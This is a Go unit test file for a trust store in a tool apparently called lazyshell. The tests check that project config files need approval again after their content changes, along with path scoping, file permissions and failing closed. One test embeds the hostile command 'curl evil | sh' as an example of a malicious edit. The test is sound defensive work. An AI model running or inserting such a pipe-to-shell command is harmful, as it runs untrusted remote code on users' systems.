package config

import (
	"os"
	"path/filepath"
	"testing"
)

// useTempTrustStore points the trust store somewhere disposable, so no test
// ever writes to the real ~/.config/lazyshell.
func useTempTrustStore(t *testing.T) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "trust.yml")
	t.Setenv("LAZYSHELL_TRUST", path)

	return path
}

func TestTrustRoundTrip(t *testing.T) {
	useTempTrustStore(t)

	project := filepath.Join(t.TempDir(), "lazyshell.yml")
	content := []byte("sessions:\n  - name: api\n")

	if IsTrusted(project, content) {
		t.Fatal("IsTrusted before any approval = true, want false (fails closed)")
	}

	if err := Trust(project, content); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	if !IsTrusted(project, content) {
		t.Error("IsTrusted after Trust = false, want true")
	}
}

// The hash is over the content, so `git pull` changing what a project launches
// asks the question again.
func TestTrustIsInvalidatedByAnEdit(t *testing.T) {
	useTempTrustStore(t)

	project := filepath.Join(t.TempDir(), "lazyshell.yml")

	if err := Trust(project, []byte("sessions:\n  - name: api\n")); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	if IsTrusted(project, []byte("sessions:\n  - name: api\n    command: curl evil | sh\n")) {
		t.Error("IsTrusted on edited content = true, want false")
	}
}

func TestTrustIsPerPath(t *testing.T) {
	useTempTrustStore(t)

	dir := t.TempDir()
	content := []byte("sessions: []\n")

	if err := Trust(filepath.Join(dir, "a.yml"), content); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	if IsTrusted(filepath.Join(dir, "b.yml"), content) {
		t.Error("IsTrusted for another path with the same content = true, want false")
	}
}

func TestTrustAccumulates(t *testing.T) {
	useTempTrustStore(t)

	dir := t.TempDir()
	a, b := filepath.Join(dir, "a.yml"), filepath.Join(dir, "b.yml")

	if err := Trust(a, []byte("a")); err != nil {
		t.Fatalf("Trust a: %v", err)
	}
	if err := Trust(b, []byte("b")); err != nil {
		t.Fatalf("Trust b: %v", err)
	}

	if !IsTrusted(a, []byte("a")) {
		t.Error("approving a second file dropped the first")
	}
	if !IsTrusted(b, []byte("b")) {
		t.Error("IsTrusted(b) = false, want true")
	}
}

func TestTrustFilePermissions(t *testing.T) {
	path := useTempTrustStore(t)

	if err := Trust(filepath.Join(t.TempDir(), "lazyshell.yml"), []byte("x")); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}

	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("trust store mode = %o, want 600", perm)
	}
}

// A corrupt store must fail closed, not blow up.
func TestTrustCorruptStoreIsNotTrusted(t *testing.T) {
	path := useTempTrustStore(t)
	writeFile(t, path, "this: [is not: a map of strings\n")

	if IsTrusted(filepath.Join(t.TempDir(), "lazyshell.yml"), []byte("x")) {
		t.Error("IsTrusted with a corrupt store = true, want false")
	}
}

func TestTrustPathDefaultsNextToTheConfig(t *testing.T) {
	t.Setenv("LAZYSHELL_TRUST", "")
	t.Setenv("LAZYSHELL_CONFIG", "/custom/lazyshell/config.yml")

	want := filepath.Join("/custom", "lazyshell", "trust.yml")
	if got := TrustPath(); got != want {
		t.Errorf("TrustPath() = %q, want %q", got, want)
	}
}
